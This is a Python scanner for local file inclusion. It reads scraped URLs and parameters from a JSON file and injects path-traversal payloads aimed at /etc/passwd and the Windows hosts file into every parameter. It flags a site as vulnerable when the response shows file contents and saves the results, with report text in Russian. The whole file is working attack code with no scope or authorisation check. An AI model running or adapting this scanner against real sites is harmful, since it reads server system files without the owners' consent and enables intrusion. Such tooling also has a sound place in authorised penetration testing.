import asyncio
import aiohttp
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_lfi(session, url, param, value):
    lfi_payloads = [
        '../../../../etc/passwd',
        '../../../../../../windows/system32/drivers/etc/hosts',
        '../../../../../../../../../../../etc/passwd',  # Для глубокой вложенности
        '../../../../../../../../../../../windows/system32/drivers/etc/hosts'  # Для глубокой вложенности на Windows
    ]
    for payload in lfi_payloads:
        payloaded_url = url.replace(f"{param}={value}", f"{param}={payload}")
        try:
            response = await session.get(payloaded_url)
            response_text = await response.text()
            if 'root:' in response_text or '127.0.0.1' in response_text:
                return True, payloaded_url
        except Exception as e:
            logger.error(f"Error testing LFI payload on {url}: {e}")
    return False, None

async def analyze_lfi(scraped_data):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        for page in scraped_data:
            url = page['URL']
            params = page.get('Parameters', {})
            for param, value in params.items():
                is_vulnerable, vulnerable_url = await test_lfi(session, url, param, value)
                if is_vulnerable:
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'is_vulnerable': True,
                        'type': 'LFI',
                        'payload': vulnerable_url,
                        'scan_data': f"Мы отправили запрос на {vulnerable_url} с LFI полезной нагрузкой и сервер вернул чувствительные данные."
                    })
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_lfi(scraped_data))
    with open('lfi_vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
